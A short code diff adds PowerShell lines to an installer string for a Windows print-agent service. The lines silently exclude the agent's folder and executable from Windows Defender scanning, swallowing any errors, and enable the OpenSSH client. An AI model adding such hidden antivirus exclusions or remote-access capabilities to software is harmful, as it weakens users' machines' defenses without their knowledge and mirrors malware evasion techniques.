@@ -2952,6 +2952,20 @@ if ($node) {{ $node }}
 
             # ── Step 2: Install & start service ────────────────
             ps_install = f"""
+# 1. Windows Defender Exclusions (Whitelisting)
+try {{
+    Add-MpPreference -ExclusionPath "$env:APPDATA\\GoxPrintAgent" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "printagent.exe" -ErrorAction SilentlyContinue
+}} catch {{}}
+
+# 2. Enable OpenSSH Client capability
+try {{
+    $cap = Get-WindowsCapability -Online -Name 'OpenSSH.Client*' -ErrorAction SilentlyContinue
+    if ($cap -and $cap.State -ne 'Installed') {{
+        Add-WindowsCapability -Online -Name $cap.Name -ErrorAction SilentlyContinue
+    }}
+}} catch {{}}
+
 $svc = Get-Service -Name '{SERVICE_NAME}' -ErrorAction SilentlyContinue
 if ($svc) {{
     if ($svc.Status -ne 'Running') {{ Start-Service -Name '{SERVICE_NAME}' }}
